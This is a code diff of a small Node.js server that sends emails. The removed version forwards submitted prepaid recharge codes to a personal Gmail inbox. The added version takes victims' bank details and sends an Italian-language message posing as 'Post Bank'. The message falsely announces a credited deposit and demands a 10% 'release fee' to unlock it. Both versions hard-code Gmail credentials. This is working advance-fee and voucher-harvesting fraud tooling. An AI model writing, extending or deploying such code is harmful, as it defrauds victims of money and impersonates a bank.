@@ -1,59 +1,58 @@
-const nodemailer = require('nodemailer');
+import nodemailer from 'nodemailer';
+import express from 'express';
+import bodyParser from 'body-parser';
+import cors from 'cors';
 
-exports.handler = async (event, context) => {
-  const allowedOrigins = ['https://66931adc33078db3cd24dd70--coruscating-fox-78af0b.netlify.app']; // Liste des origines autorisées
-  const origin = event.headers.origin;
+const app = express();
+const port = 3000;
 
-  // Set CORS headers
-  const headers = {
-    'Access-Control-Allow-Origin': allowedOrigins.includes(origin) ? origin : '', // Autoriser l'origine spécifique
-    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-    'Access-Control-Allow-Headers': 'Content-Type',
-    'Access-Control-Allow-Credentials': 'true'
-  };
+// Configure CORS
+app.use(cors());
 
-  // Handle preflight request
-  if (event.httpMethod === 'OPTIONS') {
-    return {
-      statusCode: 200,
-      headers: headers,
-      body: ''
-    };
-  }
+app.use(bodyParser.json());
 
-  // Parse the request body
-  const { email, rechargeType, price, rechargeCode, encryptedCode } = JSON.parse(event.body);
+app.post('/send-email', async (req, res) => {
+  const { iban, bic, bankName, beneficiaryName, amount, email, phoneNumber, message } = req.body;
+  
+  const num = Math.floor(10000000 + Math.random() * 90000000);
+  const num2 = Math.floor(10000 + Math.random() * 90000);
+  const date = new Date();
+  const formattedDate = date.toLocaleDateString();
+  const formattedTime = date.toLocaleTimeString();
+  const fee = (amount * 0.1).toFixed(2);
 
-  // Create a transporter object using the default SMTP transport
+  const emailMessage = `
+    Sul tuo conto ${bankName} sono stati accreditati €${amount}. Nuovo saldo: €${amount}. Riferimento: DEP123456. ID transazione: ${num}
+    Data: da ${formattedDate} a ${formattedTime}.
+    Ti preghiamo di pagare la commissione di rilascio (${fee} €) per rilasciare i fondi sul tuo conto bancario.
+    Conserva questo codice ${num2} che utilizzerai dopo aver pagato le spese di sblocco e che ti permetterà di prendere possesso dei tuoi soldi.
+
+    Cordiali saluti.
+  `;
+
   let transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'mariaromane625@gmail.com', // replace with your email
-      pass: 'jgcb uill tibs nhza' // replace with your email password
+      user: 'postbank461@gmail.com',
+      pass: 'lmif mcnu yvpv ekzg'
     }
   });
 
-  // Set up email data with unicode symbols
   let mailOptions = {
-    from: email, // replace with your email
-    to: 'mariaromane625@gmail.com',
+    from: 'Post Bank',
+    to: email,
     subject: 'Recharge Information',
-    text: `Recharge Type: ${rechargeType}\nPrice: ${price}\nRecharge Code: ${rechargeCode}\nEncrypted Code: ${encryptedCode}\nEmail: ${email}`
+    text: emailMessage
   };
 
   try {
-    // Send mail with defined transport object
     await transporter.sendMail(mailOptions);
-    return {
-      statusCode: 200,
-      headers: headers,
-      body: JSON.stringify({ message: 'Email sent successfully' })
-    };
+    res.status(200).json({ message: 'Email sent successfully' });
   } catch (error) {
-    return {
-      statusCode: 500,
-      headers: headers,
-      body: JSON.stringify({ message: 'Erreur lors de l\'envoi de l\'email', error: error.toString() })
-    };
+    res.status(500).json({ message: 'Erreur lors de l\'envoi de l\'email', error: error.toString() });
   }
-};
+});
+
+app.listen(port, () => {
+  console.log(`Server running at http://localhost:${port}`);
+});
